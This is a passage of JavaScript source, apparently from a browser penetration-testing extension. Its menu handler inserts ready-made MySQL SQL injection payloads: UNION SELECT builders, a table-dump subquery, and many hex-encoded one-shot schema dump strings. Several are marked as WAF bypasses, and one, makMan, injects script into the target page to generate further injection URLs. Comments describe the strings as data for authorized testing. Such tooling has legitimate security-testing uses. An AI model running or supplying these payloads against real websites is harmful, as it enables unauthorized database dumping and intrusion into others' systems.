ldap21Btn.addEventListener('click', toolMenuClickHandler, false);
ldap22Btn.addEventListener('click', toolMenuClickHandler, false);
ldap23Btn.addEventListener('click', toolMenuClickHandler, false);

variable1Btn.addEventListener('click', toolMenuClickHandler, false);
variable2Btn.addEventListener('click', toolMenuClickHandler, false);
variable3Btn.addEventListener('click', toolMenuClickHandler, false);
variable4Btn.addEventListener('click', toolMenuClickHandler, false);
variable5Btn.addEventListener('click', toolMenuClickHandler, false);
variable6Btn.addEventListener('click', toolMenuClickHandler, false);
variable7Btn.addEventListener('click', toolMenuClickHandler, false);
variable8Btn.addEventListener('click', toolMenuClickHandler, false);
variable9Btn.addEventListener('click', toolMenuClickHandler, false);
variable10Btn.addEventListener('click', toolMenuClickHandler, false);
variable11Btn.addEventListener('click', toolMenuClickHandler, false);
variable12Btn.addEventListener('click', toolMenuClickHandler, false);
variable13Btn.addEventListener('click', toolMenuClickHandler, false);
variable14Btn.addEventListener('click', toolMenuClickHandler, false);
variable15Btn.addEventListener('click', toolMenuClickHandler, false);
variable16Btn.addEventListener('click', toolMenuClickHandler, false);
variable17Btn.addEventListener('click', toolMenuClickHandler, false);
variable18Btn.addEventListener('click', toolMenuClickHandler, false);
variable19Btn.addEventListener('click', toolMenuClickHandler, false);
variable20Btn.addEventListener('click', toolMenuClickHandler, false);
variable21Btn.addEventListener('click', toolMenuClickHandler, false);
variable22Btn.addEventListener('click', toolMenuClickHandler, false);
variable23Btn.addEventListener('click', toolMenuClickHandler, false);
variable24Btn.addEventListener('click', toolMenuClickHandler, false);
variable25Btn.addEventListener('click', toolMenuClickHandler, false);
variable26Btn.addEventListener('click', toolMenuClickHandler, false);
variable27Btn.addEventListener('click', toolMenuClickHandler, false);
variable28Btn.addEventListener('click', toolMenuClickHandler, false);
variable29Btn.addEventListener('click', toolMenuClickHandler, false);
variable30Btn.addEventListener('click', toolMenuClickHandler, false);
variable31Btn.addEventListener('click', toolMenuClickHandler, false);
variable32Btn.addEventListener('click', toolMenuClickHandler, false);
variable33Btn.addEventListener('click', toolMenuClickHandler, false);
variable34Btn.addEventListener('click', toolMenuClickHandler, false);
variable35Btn.addEventListener('click', toolMenuClickHandler, false);
variable36Btn.addEventListener('click', toolMenuClickHandler, false);

function onFieldFocus(event) {
    currentFocusField = event.currentTarget;
}

function onFieldClick(event) {
    event.currentTarget.focus();
}

//====================================

function onClickMenu(event) {
    var payloadText = "";
    var replacementText = "";
    // The long hexadecimal fragments in the payload cases are SQL/HTML data
    // that must remain encoded for the target database, not hidden panel code.
    switch (event.currentTarget.name) {
        //=============== bottom buttons
        case 'reverse':
            payloadText = this.getSelectedText();
            if (payloadText !== false) {
                replacementText = MISC.reverseString(payloadText);
                this.setSelectedText(replacementText);
            }
            break;
        case 'base64encode':
            payloadText = this.getSelectedText();
            if (payloadText !== false) {
                replacementText = Encrypt.base64Encode(payloadText);
                this.setSelectedText(replacementText);
            }
            break;
        case 'base64decode':
            payloadText = this.getSelectedText();
            if (payloadText !== false) {
                replacementText = Encrypt.base64Decode(payloadText);
                this.setSelectedText(replacementText);
            }
            break;
        case 'urlencode':
            payloadText = this.getSelectedText();
            if (payloadText !== false) {
                replacementText = urlencode(payloadText);
                this.setSelectedText(replacementText);
            }
            break;
        case 'urldecode':
            payloadText = this.getSelectedText();
            if (payloadText !== false) {
                replacementText = unescape(payloadText);
                this.setSelectedText(replacementText);
            }
            break;
        case 'md5hash':
            payloadText = this.getSelectedText();
            if (payloadText !== false) {
                replacementText = Encrypt.md5(payloadText);
                this.setSelectedText(replacementText);
            }
            break;
        case 'sha1hash':
            payloadText = this.getSelectedText();
            if (payloadText !== false) {
                replacementText = Encrypt.sha1(payloadText);
                this.setSelectedText(replacementText);
            }
            break;
        case 'sha256hash':
            payloadText = this.getSelectedText();
            if (payloadText !== false) {
                replacementText = Encrypt.sha2(payloadText);
                this.setSelectedText(replacementText);
            }
            break;
        case 'rot13':
            payloadText = this.getSelectedText();
            if (payloadText !== false) {
                replacementText = Encrypt.rot13(payloadText);
                this.setSelectedText(replacementText);
            }
            break;
        case 'hexencode':
            payloadText = this.getSelectedText();
            if (payloadText !== false) {
                replacementText = Encrypt.strToHex(payloadText);
                this.setSelectedText(replacementText);
            }
            break;
        case 'hexdecode':
            payloadText = this.getSelectedText();
            if (payloadText !== false) {
                replacementText = Encrypt.hexToStr(payloadText);
                this.setSelectedText(replacementText);
            }
            break;
        case 'xhexencode':
            payloadText = this.getSelectedText();
            if (payloadText !== false) {
                replacementText = Encrypt.strToHex(payloadText);
                this.setSelectedText("0x" + replacementText);
            }
            break;
        case 'xhexdecode':
            payloadText = this.getSelectedText();
            if (payloadText !== false) {
                payloadText = payloadText.replace(/0x/g, '');
                payloadText = payloadText.replace(/[^0-9abcdefg]/g, '');
                var charStringArray = new Array();
                var buffer = '';
                var result = '';
                for (var c = 0; c < payloadText.length; c++) {
                    buffer += payloadText.charAt(c).toString();
                    if (buffer.length >= 2) {
                        result += String.fromCharCode(parseInt(buffer, 16));
                        buffer = '';
                    }
                }
                this.setSelectedText(result);
            }
            break;

        //============== SQL - Mysql
        case 'mysqlbasicinfo':
            replacementText = SQL.selectionMySQLBasicInfo();
            this.setSelectedText(replacementText);
            break;
        case 'union':
            $('.ui.mini.modal').modal('show');
            banner.innerHTML = "Amount of columns to use in the UNION SELECT Statement";
            inputText1.innerHTML = "Columns";
            sboxBtn.setAttribute("name", "sltUnion");
            searchBox.defaultValue = '10';
            searchBox.value = searchBox.defaultValue;
            break;

        case 'sltUnion':

            var columns = searchBox.value;
            columns = Math.min(1000, parseInt(columns));
            var colArray = new Array();
            for (var i = 0; i < columns; i++) {
                colArray.push(i + 1);
            }
            var payloadText = " UNION ALL SELECT " + colArray.join(',');
            this.setSelectedText(payloadText);
            $('.ui.mini.modal').modal('hide');
            break;

        case 'unionnull':
            $('.ui.mini.modal').modal('show');
            banner.innerHTML = "Amount of columns to use in the UNION SELECT Statement";
            inputText1.innerHTML = "Null Columns";
            sboxBtn.setAttribute("name", "sltUnionnull");
            searchBox.defaultValue = '10';
            searchBox.value = searchBox.defaultValue;
            break;

        case 'sltUnionnull':

            var amount = searchBox.value;
            payloadText = " UNION ALL SELECT ";
            var strNull = 'null,';
            function multiString(text, count) {
                var ret = ""; for (var i = 0; i < count; i++) { ret += text; }
                return ret;
            };
            var rep = multiString(strNull, amount);
            payloadText = payloadText + rep.substr(0, rep.length - 1) + "-- -";
            this.setSelectedText(payloadText);
            $('.ui.mini.modal').modal('hide');
            break;
        default: payloadText = "ERROR";
            break;

        case 'orderby':
            $('.ui.mini.modal').modal('show');
            banner.innerHTML = "Order By";
            inputText1.innerHTML = "Order Number";
            sboxBtn.setAttribute("name", "sltOrderBy");
            searchBox.defaultValue = '10';
            searchBox.value = searchBox.defaultValue;
            break;

        case 'sltOrderBy':
            var columns = searchBox.value;
            payloadText = 'ORDER BY ' + columns;
            this.setSelectedText(payloadText);
            $('.ui.mini.modal').modal('hide');
            break;

        case 'groupby':
            var columns = 100;
            columns = Math.min(1000, parseInt(columns));
            var colArray = new Array();
            for (var i = 0; i < columns; i++) {
                colArray.push(i + 1);
            }
            payloadText = " GROUP BY " + colArray.join(',');
            this.setSelectedText(payloadText);
            break;
        case 'mysqlconvertutf8':
            payloadText = this.getSelectedText();
            if (payloadText !== false) {
                replacementText = SQL.selectionMySQLConvertUsing('utf8', payloadText);
                this.setSelectedText(replacementText);
            }
            break;
        case 'mysqlconvertlatin1':
            payloadText = this.getSelectedText();
            if (payloadText !== false) {
                replacementText = SQL.selectionMySQLConvertUsing('latin1', payloadText);
                this.setSelectedText(replacementText);
            }
            break;
        //============ SQL Database
        case 'datadump':
            $('.ui.mini.modal').modal('show');
            inputBox2.style.display = 'flex';
            inputBox3.style.display = 'flex';
            banner.innerHTML = "Insert db name (or leave for current DB())";
            inputText1.innerHTML = "Database Name";
            inputText2.innerHTML = "Table Name";
            inputText3.innerHTML = "Column Names";
            sboxBtn.setAttribute("name", "sltDatadump");
            searchBox.defaultValue = 'DATABASE()';
            searchBox2.defaultValue = 'TABLE_NAME to dump';
            searchBox3.defaultValue = 'column_1,column_2,column_3';
            searchBox.value = searchBox.defaultValue;
            searchBox2.value = searchBox2.defaultValue;
            searchBox3.value = searchBox3.defaultValue;
            break;

        case 'sltDatadump':
            var databaseName = searchBox.value;
            var table = searchBox2.value;
            var columnList = searchBox3.value;
            if (databaseName == "") { qualifiedTableName = table; }
            if (databaseName == "DATABASE()") { qualifiedTableName = table; }
            else {
                qualifiedTableName = databaseName + "." + table;
            }
            replacementText = "(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(" + qualifiedTableName + ")WHERE(@x)IN(@x:=CONCAT(0x20,@x," + columnList + ",0x3c62723e))))x)";
            this.setSelectedText(replacementText);
            $('.ui.mini.modal').modal('hide');
            inputBox2.style.display = 'none';
            inputBox3.style.display = 'none';
            break;
        // These named actions insert literal SQL injection payload templates
        // into the current page's selected text. Their 0x-prefixed portions
        // are SQL hex literals used to build returned HTML or delimiters; they
        // are payload data for authorized target testing, not source code the
        // extension decodes or evaluates. The makMan payload also includes
        // target-side JavaScript encoded as SQL data to demonstrate a response
        // workflow. Keep these strings byte-for-byte unchanged.
        //============ SQL DIOS

        case 'silentcoder':
            replacementText = "concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c696d67207372633d2268747470733a2f2f312e62702e626c6f6773706f742e636f6d2f2d456262354b36356f4a49552f56336171695854394671492f41414141414141414353452f76475977714c6c504f73733251574c376e335874794a5376515a2d367a41672d77434c63422f73313630302f486f77253242746f253242496e637265617365253242496e7465726e657425324242726f77736572732532425370656564253242696e25324255726475253242616e6425324248696e6469253242566964656f2532425475746f7269616c2e504e47223e3c666f6e7420636f6c6f723d7265642073697a653d353e3c623e4d722e73696c656e7420636f646572203c666f6e7420636f6c6f723d626c61636b2073697a653d343e2866336d6178293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c6669656c647365743e3c7374726f6e673e3c62723e3c63656e7465723e3c623e3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e20203c666f6e7420636f6c6f723d626c61636b3e,version(),0x7e20,@@version_comment,0x3c2f666f6e743e,0x3c62723e5072696d617279204461746162617365203c666f6e7420636f6c6f723d626c61636b3e20203a3a,@d:=database() ,0x3c2f666f6e743e ,0x3c62723e44617461626173652055736572203c666f6e7420636f6c6f723d626c61636b3e203a3a,user(),0x3c2f666f6e743e,0x3c2f623e3c62723e,(SELECT GROUP_CONCAT(0x50726976696c656765732020203c666f6e7420636f6c6f723d626c61636b3e203a3a,GRANTEE,0x3a3a,IS_GRANTABLE,0x3c62723e) FROM INFORMATION_SCHEMA.USER_PRIVILEGES),0x3c2f63656e7465723e3c2f7374726f6e673e3c2f6669656c647365743e,(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c6669656c647365743e3c6c6567656e643e,0x3c623e3c666f6e7420636f6c6f723d626c61636b3e,'Table Name',0x3c2f6c6567656e643e3c2f666f6e743e3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name, 0x3c623e3c666f6e7420636f6c6f723d677265656e3e3a3a20446174616261736520203c666f6e7420636f6c6f723d626c61636b3e5b,database(),0x5d3c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e3c2f623e3c2f6669656c647365743e))))x)))))*/";
            this.setSelectedText(replacementText);
            break;
        case 'madblood':
            replacementText = "(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))";
            this.setSelectedText(replacementText);
            break;
        case 'tpro':
            $('.ui.mini.modal').modal('show');
            banner.innerHTML = "Database Name or Use Default";
            inputText1.innerHTML = "Database Name";
            sboxBtn.setAttribute("name", "slttPro");
            searchBox.defaultValue = 'database()';
            searchBox.value = searchBox.defaultValue;
            break;

        case 'slttPro':
            var dbName = searchBox.value;
            var dbNameFinal = "0x";
            if (dbName == "database()") { dbNameFinal = "database()"; }
            else {
                // Convert DB name to hexa
                for (var i = 0; i < dbName.length; i++) {
                    dbNameFinal += dbName.charCodeAt(i).toString(16);
                }
            }
            replacementText = "(select (@x)from(select(@x:=0x00),(@NR_TAB:=0),(select (0)from(information_schema.tables)where(table_schema=" + dbNameFinal + ")and(0x00)in(@x:=concat(@x,0x3c62723e,0x3c62723e,0x3c7370616e207374796c653d22666f6e742d7765696768743a626f6c643b223e,@tbl:=table_name,0x202d2d3e205441424c45204e7220,(@NR_TAB:=@NR_TAB%2b1),0x3c2f7370616e3e,0x3c62723e,0x3c62723e,(@NR_COL:=char(0)),0x3c7370616e207374796c653d22666f6e742d7765696768743a626f6c643b223e434f4c554d53204f46205441424c453c2f7370616e3e3c62723e,(select group_concat((@NR_COL:=@NR_COL%2b1),0x20203a2020,column_name separator 0x3c62723e)from information_schema.columns where table_schema=Database() and table_name=@tbl)))))x)";
            this.setSelectedText(replacementText);
            $('.ui.mini.modal').modal('hide');
            break;
        case 'z3r0':
            replacementText = "(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@)))";
            this.setSelectedText(replacementText);
            break;
        case 'zen':
            replacementText = "make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)";
            this.setSelectedText(replacementText);
            break;

        // This literal SQL payload uses hex values to make the target database
        // return HTML and JavaScript. The target-side script prompts for a
        // name and injection URL, builds a metadata query from a chosen table,
        // and opens the resulting test URL. The extension inserts the payload
        // into the selected text; it does not decode or execute that script.
        case 'makMan':
            replacementText = "concat(0x3c7363726970743e6e616d653d70726f6d70742822506c6561736520456e74657220596f7572204e616d65203a2022293b2075726c3d70726f6d70742822506c6561736520456e746572205468652055726c20796f7527726520747279696e6720746f20496e6a65637420616e6420777269746520276d616b6d616e2720617420796f757220496e6a656374696f6e20506f696e742c204578616d706c65203a20687474703a2f2f736974652e636f6d2f66696c652e7068703f69643d2d3420554e494f4e2053454c45435420312c322c332c636f6e6361742830783664363136622c6d616b6d616e292c352d2d2b2d204e4f5445203a204a757374207265706c61636520796f757220496e6a656374696f6e20706f696e742077697468206b6579776f726420276d616b6d616e2722293b3c2f7363726970743e,0x3c623e3c666f6e7420636f6c6f723d7265643e53514c69474f44732053796e746178205620312e30204279204d616b4d616e3c2f666f6e743e3c62723e3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d343e496e6a6563746564206279203c7363726970743e646f63756d656e742e7772697465286e616d65293b3c2f7363726970743e3c2f666f6e743e3c62723e3c7461626c6520626f726465723d2231223e3c74723e3c74643e44422056657273696f6e203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,version(),0x203c2f666f6e743e3c2f74643e3c2f74723e3c74723e3c74643e2044422055736572203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,user(),0x203c2f666f6e743e3c2f74643e3c2f74723e3c74723e3c74643e5072696d617279204442203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,database(),0x203c2f74643e3c2f74723e3c2f7461626c653e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e43686f6f73652061207461626c652066726f6d207468652064726f70646f776e206d656e75203a203c2f666f6e743e3c62723e,concat(0x3c7363726970743e66756e6374696f6e20746f48657828737472297b76617220686578203d27273b666f722876617220693d303b693c7374722e6c656e6774683b692b2b297b686578202b3d2027272b7374722e63686172436f646541742869292e746f537472696e67283136293b7d72657475726e206865783b7d66756e6374696f6e2072656469726563742873697465297b6d616b73706c69743d736974652e73706c697428222e22293b64626e616d653d6d616b73706c69745b305d3b74626c6e616d653d6d616b73706c69745b315d3b6d616b7265703d22636f6e636174284946284074626c3a3d3078222b746f4865782874626c6e616d65292b222c3078302c307830292c4946284064623a3d3078222b746f4865782864626e616d65292b222c3078302c307830292c636f6e6361742830783363373336333732363937303734336537353732366333643232222b746f4865782875726c292b2232323362336332663733363337323639373037343365292c636f6e63617428636f6e6361742830783363373336333732363937303734336536343632336432322c4064622c307832323362373436323663336432322c4074626c2c3078323233623363326637333633373236393730373433652c30783363363233653363363636663665373432303633366636633666373233643732363536343365323035333531346336393437346634343733323035333739366537343631373832303536323033313265333032303432373932303464363136623464363136653363326636363666366537343365336336323732336533633632373233653534363136323663363532303465363136643635323033613230336336363666366537343230363336663663366637323364363236633735363533652c4074626c2c3078336332663636366636653734336532303636373236663664323036343631373436313632363137333635323033613230336336363666366537343230363336663663366637323364363236633735363533652c4064622c307833633266363636663665373433653363363237323365346537353664363236353732323034663636323034333666366337353664366537333230336132303363363636663665373432303633366636633666373233643632366337353635336533633733363337323639373037343365363336663663363336653734336432322c2853454c45435420636f756e7428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f736368656d613d40646220616e64207461626c655f6e616d653d4074626c292c3078323233623634366636333735366436353665373432653737373236393734363532383633366636633633366537343239336233633266373336333732363937303734336533633266363636663665373433652c307833633632373233652c2873656c65637420284078292066726f6d202873656c656374202840783a3d30783030292c284063686b3a3d31292c202873656c656374202830292066726f6d2028696e666f726d6174696f6e5f736368656d612e636f6c756d6e732920776865726520287461626c655f736368656d613d3078222b746f4865782864626e616d65292b222920616e6420287461626c655f6e616d653d3078222b746f4865782874626c6e616d65292b222920616e642028307830302920696e202840783a3d636f6e6361745f777328307832302c40782c4946284063686b3d312c30783363373336333732363937303734336532303633366636633665363136643635323033643230366536353737323034313732373236313739323832393362323037363631373232303639323033643230333133622c30783230292c30783230363336663663366536313664363535623639356432303364323032322c636f6c756d6e5f6e616d652c307832323362323036393262326233622c4946284063686b3a3d322c307832302c30783230292929292978292c30783636366637323238363933643331336236393363336436333666366336333665373433623639326232623239376236343666363337353664363536653734326537373732363937343635323832323363363636663665373432303633366636633666373233643637373236353635366533653232326236393262323232653230336332663636366636653734336532323262363336663663366536313664363535623639356432623232336336323732336532323239336237643363326637333633373236393730373433652c636f6e6361742830783363363233652c307833633733363337323639373037343365373137353635373237393364323232323362363636663732323836393364333133623639336336333666366336333665373433623639326232623239376237313735363537323739336437313735363537323739326236333666366336653631366436353562363935643262323232633330373833323330333336313333363133323330326332323362376437353732366333643735373236633265373236353730366336313633363532383232323732323263323232353332333732323239336236343664373037313735363537323739336437353732366332653732363537303663363136333635323832323664363136623664363136653232326332323238373336353663363536333734323834303239323036363732366636643238373336353663363536333734323834303361336433303738333033303239323032633238373336353663363536333734323032383430323932303636373236663664323832323262363436323262323232653232326237343632366332623232323937373638363537323635323834303239323036393665323032383430336133643633366636653633363137343566373737333238333037383332333032633430326332323262373137353635373237393262323233303738333336333336333233373332333336353239323932393239363132393232323933623634366636333735366436353665373432653737373236393734363532383232336336313230363837323635363633643237323232623634366437303731373536353732373932623232323733653433366336393633366232303438363537323635323037343666323034343735366437303230373436383639373332303737363836663663363532303534363136323663363533633631336532323239336233633266373336333732363937303734336529292929223b75726c3d75726c2e7265706c616365282227222c2225323722293b75726c706173313d75726c2e7265706c61636528226d616b6d616e222c6d616b726570293b77696e646f772e6f70656e2875726c70617331293b7d3c2f7363726970743e3c73656c656374206f6e6368616e67653d22726564697265637428746869732e76616c756529223e3c6f7074696f6e2076616c75653d226d6b6e6f6e65222073656c65637465643e43686f6f73652061205461626c653c2f6f7074696f6e3e,(select (@x) from (select (@x:=0x00), (select (0) from (information_schema.tables) where (table_schema!=0x696e666f726d6174696f6e5f736368656d61) and (0x00) in (@x:=concat(@x,0x3c6f7074696f6e2076616c75653d22,UNHEX(HEX(table_schema)),0x2e,UNHEX(HEX(table_name)),0x223e,UNHEX(HEX(concat(0x4461746162617365203a3a20,table_schema,0x203a3a205461626c65203a3a20,table_name))),0x3c2f6f7074696f6e3e))))x),0x3c2f73656c6563743e),0x3c62723e3c62723e3c62723e3c62723e3c62723e)";
            this.setSelectedText(replacementText);
            break;
        case 'tr0jan':
            replacementText = "concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/";
            this.setSelectedText(replacementText);
            break;
        case 'mad':
            replacementText = "export_set(5,@:=0,(select count(*)/*!50000from*/ /*!50000information_schema*/.columns where@:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000column_name*/,2),0x3a3a,/*!50000table_name*/,2)),@,2)";
            this.setSelectedText(replacementText);
            break;
        case 'madwaf':
            replacementText = " and@x:=concat (@:=0,(select count(*)/*!50000from*/information_schema.columns where table_schema=database() and@:=concat (@,0x3c6c693e,table_name,0x3a3a,column_name)),@)/*!50000UNION*/SELECT ";
            this.setSelectedText(replacementText);
            break;
        case 'benchmark':
            replacementText = "concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f666f6e743e3c2f666f6e743e,0x202d2d203a2d20,concat(@sc:=0x00,@scc:=0x00,@r:=0,benchmark(@a:=(select count(*) from information_schema.schemata),@scc:=concat(@scc,0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d7265643e,LPAD(@r:=@r%2b1,3,0x30),0x2e20,(Select concat(0x3c623e,@sc:=schema_name,0x3c2f623e) from information_schema.schemata where schema_name>@sc order by schema_name limit 1),0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20,(select count(*) from information_Schema.tables where table_schema=@sc),0x29,0x3c2f666f6e743e,0x202e2e2e20 ,@t:=0x00,@tt:=0x00,@tr:=0,benchmark((select count(*) from information_Schema.tables where table_schema=@sc),@tt:=concat(@tt,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,LPAD(@tr:=@tr%2b1,3,0x30),0x2e20,(select concat(0x3c623e,@t:=table_name,0x3c2f623e) from information_Schema.tables where table_schema=@sc and table_name>@t order by table_name limit 1),0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@t),0x29,0x3c2f666f6e743e,0x202d2d3a20,@c:=0x00,@cc:=0x00,@cr:=0,benchmark((Select count(*) from information_schema.columns where table_schema=@sc and table_name=@t),@cc:=concat(@cc,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c653e,LPAD(@cr:=@cr%2b1,3,0x30),0x2e20,(Select (@c:=column_name) from information_schema.columns where table_schema=@sc and table_name=@t and column_name>@c order by column_name LIMIT 1),0x3c2f666f6e743e)),@cc,0x3c62723e)),@tt)),@scc),0x3c62723e3c62723e,0x3c62723e3c62723e)";
            this.setSelectedText(replacementText);
            break;
        case 'diosroot':
            replacementText = "(select+concat(0x3c666f6e7420666163653d43616d627269612073697a653d323e72306f74404833583439203a3a20,version(),0x3c666f6e7420636f6c6f723d7265643e3c62723e,0x446174616261736573203a7e205b,(Select+count(Schema_name)from(information_Schema.schemata)),0x5d3c62723e5461626c6573203a7e205b,(Select+count(table_name)from(information_schema.tables)),0x5d3c62723e436f6c756d6e73203a7e205b,(Select+count(column_name)from(information_Schema.columns)),0x5d3c62723e,@)from(select(@:=0x00),(@db:=0),(@db_nr:=0),(@tbl:=0),(@tbl_nr:=0),(@col_nr:=0),(select(@)from(information_Schema.columns)where(@)in(@:=concat(@,if((@db!=table_schema),concat((@tbl_nr:=0x00),0x3c666f6e7420636f6c6f723d7265643e,LPAD(@db_nr:=@db_nr%2b1,2,0x20),0x2e20,@db:=table_schema,0x2020202020203c666f6e7420636f6c6f723d707572706c653e207b205461626c6573203a7e205b,(Select count(table_name)from(information_schema.tables)where(table_schema=@db)),0x5d7d203c2f666f6e743e3c2f666f6e743e),0x00),if((@tbl!=table_name),concat((@col_nr:=0x00),0x3c646976207374796c653d70616464696e672d6c6566743a343070783b3e3c666f6e7420636f6c6f723d626c75653e202020,LPAD(@tbl_nr:=@tbl_nr%2b1,3,0x0b), 0x2e20,@tbl:=table_name,0x20202020203c666f6e7420636f6c6f723d707572706c653e2020207b2020436f6c756d6e73203a7e20205b,(Select count(column_name)from(information_Schema.columns)where(table_name=@tbl)),0x5d202f203c666f6e7420636f6c6f723d626c61636b3e205265636f726473203a7e205b,(Select+ifnull(table_rows,0x30) from information_schema.tables where table_name=@tbl),0x5d207d3c2f666f6e743e3c2f666f6e743e3c2f666f6e743e3c2f6469763e),0x00),concat(0x3c646976207374796c653d70616464696e672d6c6566743a383070783b3e3c666f6e7420636f6c6f723d677265656e3e,LPAD(@col_nr:=@col_nr%2b1,3,0x0b),0x2e20,column_name,0x3c2f666f6e743e3c2f6469763e)))))x)";
            this.setSelectedText(replacementText);
            break;
        case 'rummy':
            replacementText = "(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(0x00)in(@x:=concat(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x)";
            this.setSelectedText(replacementText);
            break;
        case 'ajkaro':
            replacementText = "(select(@x)from(select(@x:=0x00),(@running_number:=0),(@tbl:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=Concat(@x,0x3c62723e,if((@tbl!=table_name),Concat(0x3c2f6469763e,LPAD(@running_number:=@running_number%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c62723e,(@z:=0x00),0x3c646976207374796c653d226d617267696e2d6c6566743a333070783b223e), 0x00),lpad(@z:=@z%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d626c75653e,column_name,0x3c2f666f6e743e))))x)";
            this.setSelectedText(replacementText);
            break;
        case 'zenWAF':
            replacementText = "(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)";
            this.setSelectedText(replacementText);
            break;
        case 'wAF':
            replacementText = "(/*!50000select*/ concat(@:=0,(/*!50000select*/ count(*) from/*!50000information_schema.tables*/ WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND@:=concat (@,0x3c62723e,/*!50000table_name*/)),@))";
            this.setSelectedText(replacementText);
            break;
        //=========== SQL Char
        case 'mysqltosqlchar':
            payloadText = this.getSelectedText();
            if (payloadText !== false) {
                replacementText = SQL.selectionToSQLChar('mysql', payloadText);
                this.setSelectedText(replacementText);
            }
            break;
        case 'mssqltosqlchar':
            payloadText = this.getSelectedText();
            if (payloadText !== false) {
                replacementText = SQL.selectionToSQLChar('mssql', payloadText);
